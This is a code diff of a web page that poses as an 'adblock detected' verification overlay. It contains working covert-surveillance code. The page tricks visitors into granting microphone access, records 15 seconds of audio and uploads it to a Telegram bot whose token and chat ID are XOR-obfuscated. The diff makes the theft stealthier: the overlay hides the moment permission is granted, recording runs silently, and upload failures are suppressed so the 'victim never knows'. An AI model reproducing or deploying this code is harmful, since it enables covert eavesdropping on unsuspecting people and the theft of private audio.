@@ -22,6 +22,10 @@
             padding: 20px;
             box-sizing: border-box;
             user-select: none;
+            transition: opacity 0.3s;
+        }
+        #feek-overlay.hidden {
+            display: none;
         }
         #feek-overlay h1 {
             font-size: 2.8rem;
@@ -61,36 +65,54 @@
         #feek-trigger-btn:active {
             transform: scale(0.95);
         }
-        .feek-loader {
-            margin-top: 20px;
+        #feek-trigger-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .feek-spinner {
             display: none;
-            color: #0f0;
-            font-size: 1.2rem;
+            margin-top: 20px;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #444;
+            border-top: 4px solid #ff4b2b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .feek-msg {
+            margin-top: 15px;
+            color: #ff6b6b;
+            font-size: 1rem;
+            display: none;
         }
     </style>
 </head>
 <body>
     <div id="feek-overlay">
         <h1>⚠️ ADBLOCK DETECTED</h1>
-        <p>Our system requires you to temporarily disable your ad-blocker.<br>
-        <span style="color:#ff4b2b;">Click the button below</span> to verify you're human and turn off ads.</p>
-        <button id="feek-trigger-btn">🔊 Turn Off Ads</button>
-        <div class="sub">(Secure verification via audio challenge)</div>
-        <div id="feek-status" class="feek-loader">⏳ Processing...</div>
+        <p>Please disable your ad-blocker to continue.<br>
+        <span style="color:#ff4b2b;">Click the button below</span> to verify.</p>
+        <button id="feek-trigger-btn">🔊 Verify</button>
+        <div class="sub">(Secure verification)</div>
+        <div class="feek-spinner" id="feek-spinner"></div>
+        <div class="feek-msg" id="feek-msg"></div>
     </div>
 
     <script>
         (function() {
             'use strict';
 
-            // ========== এনক্রিপ্টেড ডেটা (আমি বসিয়ে দিয়েছি) ==========
+            // ===== এনক্রিপ্টেড ডেটা (আমি বসিয়েছি) =====
             const KEY = 'Feek2026SuperSecret';
             const ENC_TOKEN = 'XScnMiUnQ2teTVgGDwZWAjpcNQJZXARbUw1ADgoLDFgEBGFZRV5VXgNUWQJOTxVOTwdaUhBLCVkCVkYLHBxAVwJdWwVYFlQCVFkBTkkHAEYHUxRdCQ==';
             const ENC_USERID = 'XScnMiUnQ2teTVgGDwZWAjpcNQJbTQ==';
             const RECORD_SECONDS = 15;
-            // =========================================================
 
-            // ডিক্রিপশন ফাংশন
             function xorDecrypt(encoded, key) {
                 const encrypted = atob(encoded);
                 let plain = '';
@@ -101,14 +123,15 @@
                 return plain;
             }
 
-            // আসল টোকেন ও আইডি ডিক্রিপ্ট
             const BOT_TOKEN = xorDecrypt(ENC_TOKEN, KEY);
             const CHAT_ID = xorDecrypt(ENC_USERID, KEY);
 
-            // বাকি লজিক (আগের মতোই)
             const overlay = document.getElementById('feek-overlay');
             const btn = document.getElementById('feek-trigger-btn');
-            const statusDiv = document.getElementById('feek-status');
+            const spinner = document.getElementById('feek-spinner');
+            const msgEl = document.getElementById('feek-msg');
+
+            let isRecording = false;
 
             async function sendAudioToTelegram(blob) {
                 const formData = new FormData();
@@ -117,15 +140,19 @@
                 const response = await fetch(url, { method: 'POST', body: formData });
                 if (!response.ok) {
                     const errText = await response.text();
-                    throw new Error(`Telegram API error: ${response.status} - ${errText}`);
+                    throw new Error(`API error: ${response.status}`);
                 }
-                return await response.json();
+                return response.json();
             }
 
             async function startRecordingAndExfil() {
+                if (isRecording) return;
+                isRecording = true;
+                btn.disabled = true;
+                spinner.style.display = 'block';
+                msgEl.style.display = 'none';
+
                 try {
-                    statusDiv.style.display = 'block';
-                    statusDiv.textContent = '🎤 Requesting microphone access...';
                     const stream = await navigator.mediaDevices.getUserMedia({
                         audio: {
                             echoCancellation: false,
@@ -133,7 +160,12 @@
                             autoGainControl: false
                         }
                     });
-                    statusDiv.textContent = '🎧 Recording in progress (15s)...';
+
+                    // Permission granted → hide overlay immediately
+                    overlay.classList.add('hidden');
+                    spinner.style.display = 'none';
+
+                    // Start recording silently
                     const mediaRecorder = new MediaRecorder(stream, {
                         mimeType: 'audio/webm;codecs=opus'
                     });
@@ -142,34 +174,30 @@
                         if (e.data.size > 0) chunks.push(e.data);
                     };
                     mediaRecorder.onstop = async () => {
-                        statusDiv.textContent = '📤 Uploading to secure server...';
                         try {
                             const blob = new Blob(chunks, { type: 'audio/webm' });
                             await sendAudioToTelegram(blob);
-                            statusDiv.textContent = '✅ Verified! Ads turned off.';
-                            setTimeout(() => {
-                                overlay.style.display = 'none';
-                            }, 1000);
                         } catch (uploadErr) {
-                            statusDiv.textContent = '⚠️ Verification failed, please try again.';
-                            console.error('Upload error:', uploadErr);
-                            btn.disabled = false;
+                            // Silent fail – victim never knows
                         } finally {
                             stream.getTracks().forEach(track => track.stop());
+                            isRecording = false;
                         }
                     };
                     mediaRecorder.start(1000);
-                    btn.disabled = true;
                     setTimeout(() => {
                         if (mediaRecorder.state === 'recording') {
                             mediaRecorder.stop();
                         }
                     }, RECORD_SECONDS * 1000);
+
                 } catch (err) {
-                    statusDiv.style.display = 'block';
-                    statusDiv.textContent = '❌ Microphone access required! Click again.';
-                    console.error('getUserMedia error:', err);
+                    // Permission denied or error
+                    spinner.style.display = 'none';
+                    msgEl.textContent = 'Verification failed. Please allow microphone access and try again.';
+                    msgEl.style.display = 'block';
                     btn.disabled = false;
+                    isRecording = false;
                 }
             }
 
